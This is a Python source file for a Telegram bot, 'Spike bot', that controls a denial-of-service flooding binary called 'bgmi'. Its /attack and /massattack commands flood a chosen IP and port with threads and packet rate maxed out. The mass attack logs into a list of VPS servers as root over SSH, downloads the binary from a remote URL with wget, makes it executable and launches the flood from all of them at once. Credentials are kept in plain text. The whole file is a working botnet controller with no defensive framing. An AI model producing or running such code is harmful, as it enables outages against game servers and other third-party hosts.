import os
import asyncio
import subprocess
import threading
import paramiko
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import config  # contains BOT_TOKEN and USER_ID

# ---------------- Configuration ----------------
AUTHORIZED_USERS = [str(config.USER_ID)]
MAX_THREADS = "999"
MAX_PPS = "-1"  # unlimited packets per second
SSH_USERNAME = "root"  # Default SSH username
SSH_PASSWORD = "password"  # Default SSH password

# VPS storage
vps_list = {}
ssh_credentials = {}  # Store SSH credentials for each VPS

# ---------------- VPS Management Functions ----------------
def load_vps():
    """Load VPS list from file"""
    global vps_list, ssh_credentials
    try:
        if os.path.exists('vps_list.txt'):
            with open('vps_list.txt', 'r') as f:
                for line in f:
                    if ':' in line:
                        parts = line.strip().split(':')
                        name = parts[0]
                        ip = parts[1]
                        username = parts[2] if len(parts) > 2 else SSH_USERNAME
                        password = parts[3] if len(parts) > 3 else SSH_PASSWORD
                        
                        vps_list[name] = ip
                        ssh_credentials[name] = {'username': username, 'password': password}
    except Exception as e:
        print(f"Error loading VPS list: {e}")

def save_vps():
    """Save VPS list to file"""
    try:
        with open('vps_list.txt', 'w') as f:
            for name, ip in vps_list.items():
                creds = ssh_credentials.get(name, {'username': SSH_USERNAME, 'password': SSH_PASSWORD})
                f.write(f"{name}:{ip}:{creds['username']}:{creds['password']}\n")
    except Exception as e:
        print(f"Error saving VPS list: {e}")

def check_vps_status(ip):
    """Check if a VPS is online using ping"""
    try:
        # Run ping command (1 packet with 2 second timeout)
        result = subprocess.run(
            ['ping', '-c', '1', '-W', '2', ip],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return result.returncode == 0
    except:
        return False

def execute_ssh_command(ip, username, password, command):
    """Execute command on VPS via SSH"""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=username, password=password, timeout=10)
        
        stdin, stdout, stderr = client.exec_command(command)
        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()
        
        client.close()
        
        return True, output, error
    except Exception as e:
        return False, "", str(e)

async def send_attack_to_vps(vps_name, ip, credentials, target_ip, target_port, duration, update):
    """Send attack command to a specific VPS"""
    try:
        # Download and setup bgmi on VPS (if not already present)
        setup_cmd = "wget -O /tmp/bgmi https://example.com/bgmi && chmod +x /tmp/bgmi"
        success, output, error = execute_ssh_command(ip, credentials['username'], credentials['password'], setup_cmd)
        
        if not success:
            return f"❌ {vps_name}: SSH Connection Failed - {error}"
        
        # Execute attack command
        attack_cmd = f"timeout {duration} /tmp/bgmi {target_ip} {target_port} {duration} {MAX_THREADS} {MAX_PPS}"
        success, output, error = execute_ssh_command(ip, credentials['username'], credentials['password'], attack_cmd)
        
        if success:
            return f"✅ {vps_name}: Attack launched successfully"
        else:
            return f"❌ {vps_name}: Attack failed - {error}"
            
    except Exception as e:
        return f"❌ {vps_name}: Error - {str(e)}"

# ---------------- Commands ----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚡ Welcome! Use /attack <IP> <PORT> <DURATION> to start bgmi attacks.\n"
        "Threads and PPS are automatically maxed.\n\n"
        "Use /vps add <name> <ip> <username> <password> to add a VPS\n"
        "Use /vps list to see all VPS\n"
        "Use /vps check to check VPS status\n"
        "Use /massattack <IP> <PORT> <DURATION> to attack from all VPS"
    )

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id not in AUTHORIZED_USERS:
        await update.message.reply_text("❌ You are not authorized to run commands.")
        return

    args = context.args
    if len(args) != 3:
        await update.message.reply_text("Usage: /attack <IP> <PORT> <DURATION>")
        return

    ip, port, duration = args

    try:
        bgmi_path = os.path.join(os.getcwd(), "bgmi")
        if not os.path.exists(bgmi_path):
            await update.message.reply_text("❌ bgmi binary not found in the bot directory.")
            return

        # Make bgmi executable
        os.chmod(bgmi_path, 0o755)

        # Notify attack start
        await update.message.reply_text(
            f"⚡ Attack started on {ip}:{port} for {duration} seconds."
        )

        # Run bgmi as a subprocess and wait for it to finish
        process = await asyncio.create_subprocess_exec(
            bgmi_path, ip, str(port), str(duration), MAX_THREADS, MAX_PPS,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        # Wait for bgmi to finish
        stdout, stderr = await process.communicate()

        # Prepare debug info if any
        debug_msg = ""
        if stdout:
            debug_msg += f"bgmi stdout:\n{stdout.decode()}\n"
        if stderr:
            debug_msg += f"bgmi stderr:\n{stderr.decode()}\n"

        # Notify attack end
        await update.message.reply_text(
            f"✅ Attack on {ip}:{port} for {duration} seconds completed.\n\n{debug_msg}"
        )

    except Exception as e:
        await update.message.reply_text(f"❌ Failed to start attack: {str(e)}")

async def mass_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Attack from all VPS simultaneously"""
    user_id = str(update.effective_user.id)
    if user_id not in AUTHORIZED_USERS:
        await update.message.reply_text("❌ You are not authorized to run commands.")
        return

    args = context.args
    if len(args) != 3:
        await update.message.reply_text("Usage: /massattack <IP> <PORT> <DURATION>")
        return

    target_ip, target_port, duration = args

    if not vps_list:
        await update.message.reply_text("❌ No VPS added. Use /vps add first.")
        return

    # Notify mass attack start
    message = await update.message.reply_text(
        f"🌐 Starting MASS ATTACK on {target_ip}:{target_port} for {duration} seconds...\n"
        f"Attacking from {len(vps_list)} VPS servers..."
    )

    # Launch attacks from all VPS simultaneously
    tasks = []
    for name, ip in vps_list.items():
        credentials = ssh_credentials.get(name, {'username': SSH_USERNAME, 'password': SSH_PASSWORD})
        task = send_attack_to_vps(name, ip, credentials, target_ip, target_port, duration, update)
        tasks.append(task)

    # Wait for all attacks to complete and collect results
    results = await asyncio.gather(*tasks)

    # Prepare results message
    result_text = f"🎯 Mass Attack Results on {target_ip}:{target_port}\n\n"
    online_count = 0
    offline_count = 0

    for result in results:
        if "✅" in result:
            online_count += 1
        else:
            offline_count += 1
        result_text += f"{result}\n"

    result_text += f"\n📊 Summary: {online_count} successful, {offline_count} failed"

    await message.edit_text(result_text)

async def vps_management(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id not in AUTHORIZED_USERS:
        await update.message.reply_text("❌ You are not authorized to run commands.")
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            "VPS Management Commands:\n"
            "/vps add <name> <ip> <username> <password> - Add a new VPS\n"
            "/vps remove <name> - Remove a VPS\n"
            "/vps list - List all VPS\n"
            "/vps check - Check status of all VPS\n"
            "/vps check <name> - Check status of specific VPS\n"
            "/massattack <IP> <PORT> <DURATION> - Attack from all VPS"
        )
        return

    command = args[0].lower()
    
    if command == "add":
        if len(args) < 3:
            await update.message.reply_text("Usage: /vps add <name> <ip> <username> <password>")
            return
            
        name = args[1]
        ip = args[2]
        username = args[3] if len(args) > 3 else SSH_USERNAME
        password = args[4] if len(args) > 4 else SSH_PASSWORD
        
        vps_list[name] = ip
        ssh_credentials[name] = {'username': username, 'password': password}
        save_vps()
        await update.message.reply_text(f"✅ VPS '{name}' with IP {ip} added successfully.")
    
    elif command == "remove" and len(args) >= 2:
        name = args[1]
        if name in vps_list:
            del vps_list[name]
            if name in ssh_credentials:
                del ssh_credentials[name]
            save_vps()
            await update.message.reply_text(f"✅ VPS '{name}' removed successfully.")
        else:
            await update.message.reply_text(f"❌ VPS '{name}' not found.")
    
    elif command == "list":
        if not vps_list:
            await update.message.reply_text("No VPS added yet.")
        else:
            vps_text = "📋 VPS List:\n"
            for name, ip in vps_list.items():
                creds = ssh_credentials.get(name, {'username': SSH_USERNAME, 'password': '***'})
                vps_text += f"• {name}: {ip} (User: {creds['username']})\n"
            await update.message.reply_text(vps_text)
    
    elif command == "check":
        if len(args) == 1:
            # Check all VPS
            if not vps_list:
                await update.message.reply_text("No VPS added yet.")
                return
                
            status_text = "🔍 VPS Status Check:\n"
            online_count = 0
            
            for name, ip in vps_list.items():
                status = check_vps_status(ip)
                if status:
                    online_count += 1
                status_text += f"• {name} ({ip}): {'🟢 ONLINE' if status else '🔴 OFFLINE'}\n"
            
            status_text += f"\n📊 Online: {online_count}/{len(vps_list)} VPS"
            await update.message.reply_text(status_text)
        
        elif len(args) >= 2:
            # Check specific VPS
            name = args[1]
            if name in vps_list:
                ip = vps_list[name]
                status = check_vps_status(ip)
                await update.message.reply_text(
                    f"🔍 VPS '{name}' ({ip}): {'🟢 ONLINE' if status else '🔴 OFFLINE'}"
                )
            else:
                await update.message.reply_text(f"❌ VPS '{name}' not found.")
    
    else:
        await update.message.reply_text(
            "Invalid VPS command. Usage:\n"
            "/vps add <name> <ip> <username> <password>\n"
            "/vps remove <name>\n"
            "/vps list\n"
            "/vps check\n"
            "/vps check <name>\n"
            "/massattack <IP> <PORT> <DURATION>"
        )

# ---------------- Main Bot ----------------
if __name__ == "__main__":
    # Install paramiko if not available
    try:
        import paramiko
    except ImportError:
        print("Installing paramiko for SSH support...")
        subprocess.run(["pip", "install", "paramiko"])
        import paramiko
    
    # Load VPS list on startup
    load_vps()
    
    app = ApplicationBuilder().token(config.BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("massattack", mass_attack))
    app.add_handler(CommandHandler("vps", vps_management))

    print("Spike bot with Mass Attack capability is running...")
    app.run_polling()